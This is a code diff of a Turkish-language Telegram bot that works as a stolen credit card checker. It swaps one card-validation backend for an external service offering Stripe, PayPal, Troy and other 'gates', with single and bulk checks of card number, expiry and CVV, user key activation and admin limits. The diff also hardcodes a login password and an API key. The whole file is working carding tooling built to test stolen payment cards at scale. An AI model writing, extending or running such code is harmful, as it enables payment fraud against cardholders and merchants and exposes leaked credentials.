@@ -1,5 +1,5 @@
-# --- DOSYA: main.py (v30 - Nagi Exxen Fatihi) ---
-# Bütün eski sistemler imha edildi. Sadece yeni, daha güçlü Nagi Exxen sistemi devrede.
+# --- DOSYA: main.py (v36 - Beş Silahşörler Ordusu) ---
+# apiservicee.store'dan gelen 5 yeni API sisteme entegre edildi.
 
 import logging, requests, time, os, re, json, io
 from urllib.parse import quote
@@ -15,7 +15,7 @@ from telegram.error import Forbidden, BadRequest
 # --- BÖLÜM 1: NÖBETÇİ KULÜBESİ ---
 app = Flask('')
 @app.route('/')
-def home(): return "Nagi Exxen Lord Bot Karargahı ayakta."
+def home(): return "Lord Checker Karargahı ayakta."
 def run_flask(): app.run(host='0.0.0.0',port=8080)
 def keep_alive(): Thread(target=run_flask).start()
 
@@ -26,68 +26,71 @@ except ImportError:
     print("KRİTİK HATA: 'bot_token.py' dosyası bulunamadı!"); exit()
 
 # -----------------------------------------------------------------------------
-# 3. BİRİM: İSTİHBARAT & OPERASYON (NAGI ÖZEL HAREKAT)
+# 3. BİRİM: İSTİHBARAT & OPERASYON (YENİ ÇOKLU SİLAH SİSTEMİ)
 # -----------------------------------------------------------------------------
-class NagiChecker:
-    def __init__(self, username, password):
-        self.login_url = "https://nagi.tr/checker/login.php"
-        # Ele geçirilen plana göre, asıl hedef exxen_check.php
-        self.target_api_url = "https://nagi.tr/checker/exxen_check.php"
-        self.username = username
-        self.password = password
+class ApiServiceChecker:
+    def __init__(self, key):
+        self.base_url = "https://apiservicee.store/"
+        self.key = key
         self.session = requests.Session()
         self.session.headers.update({'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
-        self.timeout = 25
+        self.timeout = 30
 
     def login(self) -> bool:
-        """Kullanıcı adı ve şifreyle NagiTR'ye giriş yapar."""
+        """Anahtarla apiservicee.store'a giriş yapar."""
         try:
-            # Plandan öğrendiğimiz gibi, form verilerinin adı 'username' ve 'password'
-            payload = {'username': self.username, 'password': self.password, 'login': ''}
-            response = self.session.post(self.login_url, data=payload, timeout=self.timeout)
-            # Başarılı girişte artık login.php'de olmamalıyız.
-            if response.ok and "dashboard.php" in response.url:
-                logging.info("NagiChecker girişi başarılı.")
+            # Plandan öğrendiğimiz gibi, keydogrulama.php'ye istek atıyoruz.
+            login_url = f"{self.base_url}keydogrulama.php?key={self.key}"
+            response = self.session.get(login_url, timeout=self.timeout)
+            data = response.json()
+            if response.ok and data.get('status') == 'success':
+                logging.info(f"ApiServiceChecker girişi başarılı. Sahip: {data.get('owner')}")
                 return True
             else:
-                logging.error(f"NagiChecker giriş başarısız. Yanıt: {response.text[:200]}")
+                logging.error(f"ApiServiceChecker giriş başarısız. Sebep: {data.get('message')}")
                 return False
-        except requests.exceptions.RequestException as e:
-            logging.error(f"NagiChecker giriş hatası: {e}"); return False
+        except Exception as e:
+            logging.error(f"ApiServiceChecker giriş hatası: {e}"); return False
 
-    def check_card(self, card):
-        """Kartı NagiTR'nin Exxen API'sinde kontrol eder."""
+    def _check(self, gateway, card):
+        """Belirtilen gateway için ortak check fonksiyonu."""
         try:
-            # Plandan öğrendiğimiz gibi, API JSON formatında 'cc' bekliyor.
-            api_payload = {'cc': card}
-            response = self.session.post(self.target_api_url, json=api_payload, timeout=self.timeout)
-            
-            # Gelen cevabı JSON olarak yorumlamaya çalış
-            try:
-                data = response.json()
-                status = data.get('status', 'Bilinmiyor')
-                resp_msg = data.get('response', 'Yanıt yok')
-                return f"{status} - {resp_msg}"
-            except json.JSONDecodeError:
-                # Eğer cevap JSON değilse, olduğu gibi göster (muhtemelen bir hata sayfasıdır)
-                return f"❌ HATA: API'den beklenmedik yanıt: {response.text[:150]}"
+            endpoint = f"{self.base_url}gate/{gateway}.php"
+            # tumkartv2 GET, diğerleri POST kullanıyor.
+            if gateway == 'tumkart2':
+                full_url = f"{endpoint}?key={self.key}&lista={quote(card)}"
+                response = self.session.get(full_url, timeout=self.timeout)
+            else:
+                form_data = {'lista': card, 'key': self.key}
+                response = self.session.post(endpoint, data=form_data, timeout=self.timeout)
 
-        except requests.exceptions.RequestException as e:
-            return f"❌ HATA: {e}"
+            # Gelen cevabı yorumla
+            result_text = response.text.strip()
+            if "approved" in result_text.lower() or "live" in result_text.lower() or "✅" in result_text:
+                return f"✅ Approved - {result_text}"
+            else:
+                return f"❌ Declined - {result_text}"
+        except Exception as e:
+            return f"❌ HATA ({gateway}): {e}"
+
+    def check_tumkartv2(self, card): return self._check('tumkart2', card)
+    def check_stripe_auth(self, card): return self._check('tumkart', card) # Dosya adı tumkart.php
+    def check_troy(self, card): return self._check('troy', card)
+    def check_paypal(self, card): return self._check('paypal', card)
+    def check_stripe_charge(self, card): return self._check('stripe', card)
 
 # -----------------------------------------------------------------------------
-# 4. BİRİM: LORDLAR SİCİL DAİRESİ (User Manager) - Değişiklik yok
+# 4. BİRİM: LORDLAR SİCİL DAİRESİ (User Manager)
 # -----------------------------------------------------------------------------
 class UserManager:
-    # ... (Bu class'ın tamamı öncekiyle aynı, değişiklik yok)
+    # ... (Bu class'ta değişiklik yok) ...
     def __init__(self, initial_admin_id):
         self.keys_file = "keys.txt"; self.activated_users_file = "activated_users.json"
         self.admin_keys_file = "admin_keys.txt"; self.activated_admins_file = "activated_admins.json"
         self.unused_keys = self._load_from_file(self.keys_file); self.activated_users = self._load_from_json(self.activated_users_file)
         self.unused_admin_keys = self._load_from_file(self.admin_keys_file); self.activated_admins = self._load_from_json(self.activated_admins_file)
         if not self.activated_admins and initial_admin_id != 0:
-             self.activated_admins[str(initial_admin_id)] = "founding_father"
-             logging.info(f"Kurucu Komutan (ID: {initial_admin_id}) admin olarak atandı."); self._save_all_data()
+             self.activated_admins[str(initial_admin_id)] = "founding_father"; logging.info(f"Kurucu Komutan (ID: {initial_admin_id}) admin olarak atandı."); self._save_all_data()
     def _load_from_file(self, filename):
         if not os.path.exists(filename): return set()
         with open(filename, "r") as f: return {line.strip() for line in f if line.strip()}
@@ -125,32 +128,42 @@ def log_activity(user: User, card: str, result: str):
 
 async def bulk_check_job(context: ContextTypes.DEFAULT_TYPE):
     job_data = context.job.data; user_id = job_data['user_id']; user = job_data['user']; cards = job_data['cards']
-    site_checker: NagiChecker = context.bot_data['nagi_checker']
+    checker_method_name = job_data['checker_method']
+    site_checker: ApiServiceChecker = context.bot_data['api_service_checker']
+    
+    # Doğru check metodunu çağırmak için getattr kullanıyoruz
+    check_function = getattr(site_checker, checker_method_name)
+
     await context.bot.send_message(chat_id=user_id, text=f"Operasyon çavuşu, {len(cards)} kartlık görevi devraldı. Tarama başladı...")
-    report_content = "";
+    report_content = ""
     for card in cards:
-        result = site_checker.check_card(card); log_activity(user, card, result)
-        report_content += f"KART: {card}\nSONUÇ: {result}\n\n"; time.sleep(1) # Nagi için 1 saniye bekleyelim
+        result = check_function(card); log_activity(user, card, result)
+        report_content += f"KART: {card}\nSONUÇ: {result}\n\n"; time.sleep(1) # API'yi yormamak için 1 saniye bekle
     report_file = io.BytesIO(report_content.encode('utf-8'))
     await context.bot.send_document(chat_id=user_id, document=report_file, filename="sonuclar.txt", caption="Raporun hazır.")
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_manager: UserManager = context.bot_data['user_manager']
     if user_manager.is_user_activated(update.effective_user.id):
-        await update.message.reply_text("Lordum, emrindeyim!\n`/exxen` komutunu kullanabilirsin.")
+        await update.message.reply_text("Lordum, emrindeyim! Kullanabileceğin komutlar:\n`/tumkartv2`\n`/stripeauth`\n`/troy`\n`/paypal`\n`/stripecharge`")
     else:
-        await update.message.reply_text("Nagi Exxen Checker'a hoşgeldin,\nherhangi bir sorunun olursa Owner: @tanriymisimben e sorabilirsin.")
+        await update.message.reply_text("Api Service Checker'a hoşgeldin,\nherhangi bir sorunun olursa Owner: @Farkederli e sorabilirsin.")
         keyboard = [[InlineKeyboardButton("Evet, bir key'im var ✅", callback_data="activate_start"), InlineKeyboardButton("Hayır, bir key'im yok", callback_data="activate_no_key")]]
         await update.message.reply_text("Botu kullanmak için bir key'in var mı?", reply_markup=InlineKeyboardMarkup(keyboard))
 
-async def exxen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_manager: UserManager = context.bot_data['user_manager']
-    if not user_manager.is_user_activated(update.effective_user.id):
-        await update.message.reply_text("Bu komutu kullanmak için önce /start yazarak bir anahtar aktive etmelisin."); return
-    keyboard = [[InlineKeyboardButton("Tekli Kontrol", callback_data="mode_single"), InlineKeyboardButton("Çoklu Kontrol", callback_data="mode_multiple")]]
-    await update.message.reply_text(f"**EXXEN** cephesi seçildi. Tarama modunu seç Lord'um:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
+def checker_command_factory(method_name, display_name):
+    """Farklı checker komutları için handler üreten fabrika."""
+    async def command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        user_manager: UserManager = context.bot_data['user_manager']
+        if not user_manager.is_user_activated(update.effective_user.id):
+            await update.message.reply_text("Bu komutu kullanmak için önce /start yazarak bir anahtar aktive etmelisin."); return
+        
+        context.user_data['checker_method'] = method_name
+        keyboard = [[InlineKeyboardButton("Tekli Kontrol", callback_data="mode_single"), InlineKeyboardButton("Çoklu Kontrol", callback_data="mode_multiple")]]
+        await update.message.reply_text(f"**{display_name}** cephesi seçildi. Tarama modunu seç Lord'um:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)
+    return command_handler
 
-# ... (Admin komutları ve diğer handlerlar aynı, sadece /puan yerine /exxen kullanılacak)
+# ... (Diğer handler'lar aynı) ...
 async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE): # Değişiklik yok
     user_manager: UserManager = context.bot_data['user_manager']; key = context.args[0] if context.args else None
     if not key: await update.message.reply_text("Kullanım: `/addadmin <admin-anahtarı>`"); return
@@ -187,23 +200,26 @@ async def main_message_handler(update: Update, context: ContextTypes.DEFAULT_TYP
     user_manager: UserManager = context.bot_data['user_manager']
     if context.user_data.get('awaiting_key', False):
         key = update.message.text.strip(); result = user_manager.activate_user(update.effective_user.id, key)
-        if result == "Success": await update.message.reply_text("✅ Anahtar kabul edildi!\n\nLord ailesine hoşgeldiniz. `/exxen` komutunu kullanabilirsiniz.")
+        if result == "Success": await update.message.reply_text("✅ Anahtar kabul edildi!\n\nLord ailesine hoşgeldiniz.")
         else: await update.message.reply_text(f"❌ {result}")
         context.user_data['awaiting_key'] = False; return
     if not user_manager.is_user_activated(update.effective_user.id): await update.message.reply_text("Botu kullanmak için /start yazarak başla."); return
-    if 'mode' not in context.user_data: await update.message.reply_text("Önce `/exxen` komutuyla bir tarama modu seçmen lazım."); return
+    if 'mode' not in context.user_data or 'checker_method' not in context.user_data:
+        await update.message.reply_text("Önce bir checker komutuyla (`/troy`, `/paypal` vs.) cephe ve mod seçmelisin."); return
     if context.user_data.get('mode') == 'single':
         cards = re.findall(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', update.message.text)
         if not cards: return
         card = cards[0]; await update.message.reply_text(f"Tekli modda kart taranıyor...")
-        site_checker: NagiChecker = context.bot_data['nagi_checker']
-        result = site_checker.check_card(card); log_activity(update.effective_user, card, result)
+        site_checker: ApiServiceChecker = context.bot_data['api_service_checker']
+        checker_method_name = context.user_data['checker_method']
+        check_function = getattr(site_checker, checker_method_name)
+        result = check_function(card); log_activity(update.effective_user, card, result)
         await update.message.reply_text(f"KART: {card}\nSONUÇ: {result}")
-        context.user_data.pop('mode', None)
+        context.user_data.pop('mode', None); context.user_data.pop('checker_method', None)
 async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_manager: UserManager = context.bot_data['user_manager']
-    if not context.user_data.get('awaiting_bulk_file'): return
     if not user_manager.is_user_activated(update.effective_user.id): return
+    if not context.user_data.get('awaiting_bulk_file') or 'checker_method' not in context.user_data: return
     await update.message.reply_text("Dosya alındı, askeri konvoy indiriliyor...")
     try:
         file = await context.bot.get_file(update.message.document); file_content_bytes = await file.download_as_bytearray()
@@ -216,10 +232,10 @@ async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_admin = user_manager.is_user_admin(update.effective_user.id); limit = 5000 if is_admin else 120
     if len(cards) > limit:
         await update.message.reply_text(f"DUR! Dosyadaki kart sayısı ({len(cards)}) limitini aşıyor. Senin limitin: {limit} kart."); return
-    job_data = {'user_id': update.effective_user.id, 'user': update.effective_user, 'cards': cards, 'checker': 'nagi'}
+    job_data = {'user_id': update.effective_user.id, 'user': update.effective_user, 'cards': cards, 'checker_method': context.user_data['checker_method']}
     context.job_queue.run_once(bulk_check_job, 0, data=job_data, name=f"check_{update.effective_user.id}")
     await update.message.reply_text("✅ Emir alındı! Operasyon Çavuşu görevi devraldı...")
-    context.user_data.pop('awaiting_bulk_file', None); context.user_data.pop('mode', None)
+    context.user_data.pop('awaiting_bulk_file', None); context.user_data.pop('mode', None); context.user_data.pop('checker_method', None)
 
 # -----------------------------------------------------------------------------
 # 6. BİRİM: ANA KOMUTA MERKEZİ (main)
@@ -228,22 +244,30 @@ def main():
     if not TELEGRAM_TOKEN or "BURAYA" in TELEGRAM_TOKEN or not ADMIN_ID:
         print("KRİTİK HATA: 'bot_token.py' dosyasını doldurmadın!"); return
     keep_alive()
-    nagi_checker = NagiChecker(username="semaviturkoglu", password="0545Semavi@")
-    if not nagi_checker.login(): print("UYARI: NagiChecker'a giriş yapılamadı! Giriş bilgileri veya site yapısı değişmiş olabilir.")
-    else: print("NagiChecker birimi aktif.")
+    api_service_checker = ApiServiceChecker(key="Sikis-Purna-31-2030Rabia")
+    if not api_service_checker.login(): print("UYARI: ApiServiceChecker'a giriş yapılamadı!")
+    else: print("ApiServiceChecker birimi aktif.")
     user_manager_instance = UserManager(initial_admin_id=ADMIN_ID)
-    print("Nagi Exxen Lord Botu aktif...")
+    print("Lordlar Kulübü (v36 - Beş Silahşörler) aktif...")
     application = Application.builder().token(TELEGRAM_TOKEN).build()
-    application.bot_data['nagi_checker'] = nagi_checker
+    application.bot_data['api_service_checker'] = api_service_checker
     application.bot_data['user_manager'] = user_manager_instance
+    
+    # Bütün komutları ekle
     application.add_handler(CommandHandler("start", start_command))
-    application.add_handler(CommandHandler(["check", "exxen"], exxen_command))
+    application.add_handler(CommandHandler("tumkartv2", checker_command_factory('check_tumkartv2', 'Tüm Kart V2')))
+    application.add_handler(CommandHandler("stripeauth", checker_command_factory('check_stripe_auth', 'Stripe Auth')))
+    application.add_handler(CommandHandler("troy", checker_command_factory('check_troy', 'Troy')))
+    application.add_handler(CommandHandler("paypal", checker_command_factory('check_paypal', 'PayPal')))
+    application.add_handler(CommandHandler("stripecharge", checker_command_factory('check_stripe_charge', 'Stripe Charge')))
     application.add_handler(CommandHandler("addadmin", addadmin_command))
     application.add_handler(CommandHandler("logs", logs_command))
     application.add_handler(CommandHandler("duyuru", duyuru_command))
+    
     application.add_handler(CallbackQueryHandler(button_callback))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, main_message_handler))
     application.add_handler(MessageHandler(filters.Document.TXT, document_handler))
+    
     application.run_polling()
 
 if __name__ == '__main__':
